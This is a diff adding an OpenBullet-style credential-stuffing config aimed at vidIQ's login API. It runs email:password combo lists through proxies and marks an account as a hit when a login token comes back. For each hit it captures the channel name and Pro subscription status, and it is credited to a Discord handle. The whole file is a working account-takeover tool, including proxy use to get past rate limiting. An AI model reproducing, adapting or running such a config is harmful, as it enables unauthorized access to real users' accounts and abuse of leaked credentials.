@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "vidiq",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-01T09:12:59.9078108+00:00",
+  "AdditionalInfo": "",
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.vidiq.com/auth/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://app.vidiq.com/" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: https://app.vidiq.com" 
+  HEADER "Connection: keep-alive" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect credentials. Try again" 
+    KEY "Too many sign in attempts, retry later" 
+  KEYCHAIN Success OR 
+    KEY "{\"token\":\"" 
+
+#Name PARSE "<SOURCE>" LR "name\":\"" "\"" CreateEmpty=FALSE -> CAP "Channel_Name" 
+
+#pro PARSE "<SOURCE>" LR ",\"pro\":" "," CreateEmpty=FALSE -> CAP "Pro" 
+
+FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By" 
+
